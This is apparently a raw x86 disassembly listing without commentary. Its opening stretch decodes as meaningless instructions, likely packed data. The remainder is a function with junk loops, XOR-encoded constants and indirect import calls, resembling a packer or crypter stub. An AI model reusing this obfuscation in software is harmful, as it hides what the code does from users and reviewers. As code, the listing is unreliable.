  414c6b:	inc    edi
  414c6c:	mov    dh,0xe5
  414c6e:	mov    edx,0x700920a4
  414c73:	mov    ch,0x20
  414c75:	fsubr  QWORD PTR [bp-0xc]
  414c79:	clc    
  414c7a:	(bad)  
  414c7b:	out    dx,eax
  414c7c:	int    0x44
  414c7e:	adc    bl,BYTE PTR [ebp-0x2a72fd05]
  414c84:	cld    
  414c85:	es loopne 0x414c9a
  414c88:	push   ebp
  414c89:	mov    ah,0xc1
  414c8b:	sub    DWORD PTR [edi-0x74],esp
  414c8e:	sub    ch,BYTE PTR [eax]
  414c90:	jmp    0x61b4f41e
  414c95:	(bad)  
  414c96:	and    BYTE PTR [ebp+0x41b50ff5],ah
  414c9c:	popf   
  414c9d:	sbb    BYTE PTR [ecx-0x42],ah
  414ca0:	jnp    0x414d19
  414ca2:	mov    edi,0x47a20183
  414ca7:	and    DWORD PTR [edx+0x10737959],0x1e9704f6
  414cb1:	adc    DWORD PTR cs:0x8eaac4ba,esi
  414cb8:	jmp    0x414cd4
  414cba:	es push 0xffffffe2
  414cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cbe:	lds    ebx,FWORD PTR [edi]
  414cc0:	sub    cl,BYTE PTR [esi-0x7cf5e9a9]
  414cc6:	imul   edi,DWORD PTR ds:0x9659fd9c,0xffffffec
  414ccd:	inc    edi
  414cce:	push   ss
  414ccf:	ja     0x414d45
  414cd1:	or     eax,0x5ad85230
  414cd6:	pop    ecx
  414cd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cd8:	jl     0x414d15
  414cda:	js     0x414d2c
  414cdc:	imul   ebp,DWORD PTR [esi-0x69],0x4acc82eb
  414ce3:	jmp    0x11fbed83
  414ce8:	mov    eax,0xbbb1d13e
  414ced:	sub    BYTE PTR ds:0xb6a0a1a8,dl
  414cf3:	cmc    
  414cf4:	imul   BYTE PTR [ecx]
  414cf6:	(bad)
  414cfa:	pop    ecx
  414cfb:	shl    ah,0x43
  414cfe:	add    al,0xfc
  414d00:	xchg   ebx,eax
  414d01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d02:	xor    al,0x0
  414d04:	mov    esi,0x9e91cf5e
  414d09:	(bad)  
  414d0a:	mov    bh,0xfa
  414d0c:	iret   
  414d0d:	div    BYTE PTR [esi]
  414d0f:	jmp    0x414cd7
  414d11:	cmp    edx,edi
  414d13:	or     eax,0xaa420995
  414d18:	mov    ecx,0x82d6bb78
  414d1d:	jbe    0x414cab
  414d1f:	data16 mov ch,0x13
  414d22:	push   ss
  414d23:	loope  0x414cfe
  414d25:	jp     0x414d24
  414d27:	pop    ebp
  414d28:	pop    eax
  414d29:	ror    BYTE PTR [ebp+0x40],1
  414d2c:	jecxz  0x414d96
  414d2e:	add    eax,0x4e549408
  414d33:	pop    ss
  414d34:	sbb    ch,BYTE PTR ds:0x8cff64e7
  414d3a:	xchg   ebx,eax
  414d3b:	loopne 0x414d03
  414d3d:	xchg   ebp,eax
  414d3e:	(bad)  
  414d40:	jno    0x414d9a
  414d42:	mov    bh,0x8d
  414d44:	xchg   esp,eax
  414d45:	js     0x414d57
  414d47:	xor    BYTE PTR ds:0xd2f9b4d2,0xbc
  414d4e:	mov    ds:0x4e64d5fa,eax
  414d53:	ret    
  414d54:	xchg   ecx,eax
  414d55:	(bad)  
  414d56:	push   0xdca5df8c
  414d5b:	sbb    cl,ch
  414d5d:	sar    ch,0xce
  414d60:	dec    esi
  414d61:	jecxz  0x414d91
  414d63:	sub    esi,DWORD PTR [esi]
  414d65:	pop    ebx
  414d66:	cli    
  414d67:	enter  0xa2fc,0x38
  414d6b:	mov    BYTE PTR [ebx-0x53],0x8b
  414d6f:	push   ebx
  414d70:	inc    ebp
  414d71:	cmp    dl,bh
  414d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d74:	arpl   WORD PTR [ebx+esi*2-0x6e],di
  414d78:	mov    edx,0xd3b06fd0
  414d7d:	dec    ebp
  414d7e:	(bad)  
  414d7f:	or     al,0x45
  414d81:	cwde   
  414d82:	push   esp
  414d83:	js     0x414d0b
  414d85:	scas   al,BYTE PTR es:[edi]
  414d86:	mov    DWORD PTR [ebx-0x3b],eax
  414d89:	cs out dx,al
  414d8b:	mov    edx,0x412ba80a
  414d90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d91:	(bad)  
  414d92:	sar    BYTE PTR [eax],1
  414d94:	call   0x9f59:0xc19a62dd
  414d9b:	xor    DWORD PTR cs:[ebp-0x4f],ecx
  414d9f:	and    dh,BYTE PTR [esi-0x51]
  414da2:	shl    BYTE PTR [esi+0x6704eb11],0xe0
  414da9:	shl    BYTE PTR [ecx],1
  414dab:	xor    eax,DWORD PTR [ebx]
  414dad:	xchg   esp,eax
  414dae:	pop    ebx
  414daf:	pop    es
  414db0:	(bad)  
  414db2:	ret    
  414db3:	ja     0x414d3d
  414db5:	pop    edi
  414db6:	pop    ds
  414db7:	imul   esp,ebp,0x62
  414dba:	sbb    eax,0xee18c00a
  414dbf:	fmul   st,st(0)
  414dc1:	gs leave 
  414dc3:	popf   
  414dc4:	adc    esi,DWORD PTR [ecx+ebx*8+0xc]
  414dc8:	(bad)  
  414dc9:	aad    0x49
  414dcb:	sbb    al,0x2d
  414dcd:	dec    edx
  414dce:	xor    al,0xbc
  414dd0:	mov    dl,0x3e
  414dd2:	lods   al,BYTE PTR ds:[esi]
  414dd3:	in     al,dx
  414dd4:	loopne 0x414d98
  414dd6:	sub    al,bl
  414dd8:	cmp    eax,0x32c73ba0
  414ddd:	and    al,0xb5
  414ddf:	ins    DWORD PTR es:[edi],dx
  414de0:	adc    dl,BYTE PTR [eax+0x1dc79873]
  414de6:	sbb    al,0xd7
  414de8:	mov    ch,0xbb
  414dea:	ss inc ebx
  414dec:	mov    al,ds:0x1125cd41
  414df1:	sbb    ch,BYTE PTR [ebx]
  414df3:	push   ebp
  414df4:	jecxz  0x414d97
  414df6:	arpl   WORD PTR [ebp-0x331cea91],si
  414dfc:	mov    bh,0x98
  414dfe:	imul   eax,edx,0x2b
  414e01:	inc    esi
  414e02:	shl    BYTE PTR [ecx+0x492fb7a],cl
  414e08:	xchg   ebp,eax
  414e09:	sbb    eax,DWORD PTR [esi+0x27da7a27]
  414e0f:	jp     0x414da0
  414e11:	lods   eax,DWORD PTR ds:[esi]
  414e12:	imul   BYTE PTR [edi-0xba5a1a6]
  414e18:	jne    0x414e67
  414e1a:	xchg   ebx,eax
  414e1b:	adc    edx,DWORD PTR [ebx]
  414e1d:	sbb    eax,0x8afbbb4
  414e22:	lea    edx,[edx-0x2e]
  414e25:	and    esi,ebx
  414e27:	pusha  
  414e28:	jbe    0x40fa94
  414e2e:	pop    ebx
  414e2f:	pop    edi
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42a7f5
  414e44:	xor    DWORD PTR ds:0x42a771,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42a7b9,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42a841,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42a841
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42a841,eax
  414e70:	cmp    DWORD PTR ds:0x42a841,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42a841,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42a84d
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42a801
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42a7f9,0x42a831
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42a801,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42a835,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42a775
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42a845,0x42a765
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42a7b1,0x42a841
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42a801,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42a769,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42a7fd,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42a7fd
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42a7fd,edi
  414f60:	cmp    DWORD PTR ds:0x42a7fd,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42a7fd,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42a809
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42a7fd,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42a7fd
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42a7fd,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42a7b5,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42a7c9,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42a76d
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42a845,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42a849,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42a7b9
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42a805,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42a845,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42a849,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42a849
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42a849,ecx
  415032:	cmp    DWORD PTR ds:0x42a849,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42a849,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42a871
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42a7f1,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42a885,0x42a7b5
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42a7c1,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42a7c5,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42a879,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42a879
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42a879,ecx
  4150bb:	cmp    DWORD PTR ds:0x42a879,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42a879,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42a83d
  4150e5:	xor    ecx,DWORD PTR ds:0x42a84d
  4150eb:	mov    DWORD PTR ds:0x42a83d,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42a7b1,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42a7f1
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42a875,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42a875
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42a875,ecx
  415120:	cmp    DWORD PTR ds:0x42a875,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42a875,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42a75d,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42a75d
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42a75d,ecx
  41515e:	cmp    DWORD PTR ds:0x42a75d,0xe
  415165:	jne    0x415176
  41516b:	push   0x42a99f
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42a75d,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42a75d
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42a75d,ecx
  415190:	cmp    DWORD PTR ds:0x42a75d,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42a781
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42a7c1,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42a7c1
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42a7c1,ecx
  4151c1:	cmp    DWORD PTR ds:0x42a7c1,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42a7c1,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42a7c1,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42a7c1
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42a7c1,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42a7c9,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42a7c9
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42a7c9,ecx
  415230:	cmp    DWORD PTR ds:0x42a7c9,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42a7c9,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42a775
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42a7c9,0x42a881
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42a871,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42a841,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42a839,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42a765,0x42a87d
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42a83d,0x42a759
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42a7cd,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42a7cd
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42a7cd,ecx
  4152f0:	cmp    DWORD PTR ds:0x42a7cd,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42a7cd,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42a849
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42a781,0x10
  415329:	cmp    DWORD PTR ds:0x42a781,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42a781,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42a781,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42a781
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42a781,edx
  41536d:	mov    edx,DWORD PTR ds:0x42a781
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42a781,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42a7f1,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42a7f1
  415393:	inc    eax
  415394:	mov    ds:0x42a7f1,eax
  415399:	cmp    DWORD PTR ds:0x42a7f1,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42a7f1,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42a759
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42a7bd,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42a831,0x0
  4153ed:	mov    eax,ds:0x42a831
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42a831,eax
  4153f8:	cmp    DWORD PTR ds:0x42a831,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42a932
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42a831,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42a831
  41542b:	inc    eax
  41542c:	mov    ds:0x42a831,eax
  415431:	cmp    DWORD PTR ds:0x42a831,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42a761,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42a88d,0x1d
  41545d:	cmp    DWORD PTR ds:0x42a88d,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42a88d,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42a769
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42a88d,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42a88d
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42a88d,edx
  4154af:	mov    edx,DWORD PTR ds:0x42a88d
  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42a88d,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42a7b9
  4154c7:	and    edx,DWORD PTR ds:0x42a84d
  4154cd:	mov    DWORD PTR ds:0x42a7b9,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42a781,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
  4154e3:	add    DWORD PTR ds:0x42a835,0x42a7f1
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42a835,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42a7c5,0x42a805
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42a7f5,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42a761,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42a7bd,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42a7bd
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42a7bd,ecx
  415552:	cmp    DWORD PTR ds:0x42a7bd,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42a845
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42a7bd,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42a87d,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42a87d
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42a87d,ecx
  4155a7:	cmp    DWORD PTR ds:0x42a87d,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42a87d,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
